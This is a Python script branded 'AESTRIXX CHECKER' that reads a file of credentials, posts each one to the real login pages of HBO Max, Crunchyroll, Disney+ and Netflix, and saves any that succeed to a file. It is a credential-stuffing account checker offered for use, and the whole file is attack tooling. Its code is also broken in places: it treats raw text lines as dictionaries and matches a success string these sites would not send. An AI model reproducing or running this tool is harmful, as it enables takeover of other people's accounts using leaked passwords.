import os
import requests
from art import text2art
from termcolor import colored

def verificar_login(login_info, login_url, arquivo_saida):
    # Enviar solicitação POST para fazer login
    response = requests.post(login_url, data=login_info)

    # Verificar se o login foi bem-sucedido com base na resposta
    if 'Login bem-sucedido' in response.text:
        print(f"Login bem-sucedido para usuário {login_info['username']} em {login_url}.")
        # Salvar o login válido em um arquivo separado
        with open(arquivo_saida, 'a') as f:
            f.write(f"Usuário: {login_info['username']}, URL: {login_url}\n")
        return True
    else:
        print(f"Falha no login para usuário {login_info['username']} em {login_url}.")
        return False

# Função para verificar logins de uma lista de usuários em um determinado URL
def verificar_logins_para_url(usuarios, login_url, arquivo_saida):
    for usuario in usuarios:
        verificar_login(usuario, login_url, arquivo_saida)

# Exemplo de uso
dados_login = {
    'HBO Max': 'https://auth.max.com/login?flow=login',
    'Crunchyroll': 'https://sso-v2.crunchyroll.com/login',
    'Disney+': 'https://www.disneyplus.com/identity/login/enter-email?pinned=true',
    'Netflix': 'https://www.netflix.com/login',
    # Adicione mais sites conforme necessário
}

# Arte ASCII colorida
art = text2art("AESTRIXX CHECKER by C4inCode", font="Small")  # Insira sua arte ASCII aqui
print(colored(art, "green"))  # Altera a cor da arte para verde

print("Escolha o site para verificar o login:")
for i, site in enumerate(dados_login.keys(), start=1):
    print(f"{i}. {site}")

escolha_site = input("Digite o número do site que deseja verificar: ")

if escolha_site.isdigit() and 1 <= int(escolha_site) <= len(dados_login):
    site_escolhido = list(dados_login.keys())[int(escolha_site) - 1]
    arquivo_logins = input("Digite o caminho do arquivo de logins: ")
    if os.path.exists(arquivo_logins):
        print(f"Verificando logins para {site_escolhido}:")
        verificar_logins_para_url(open(arquivo_logins).readlines(), dados_login[site_escolhido], 'logins_validos.txt')
        print("Logins válidos salvos em 'logins_validos.txt'")
    else:
        print("Arquivo de logins não encontrado.")
else:
    print("Escolha inválida.")
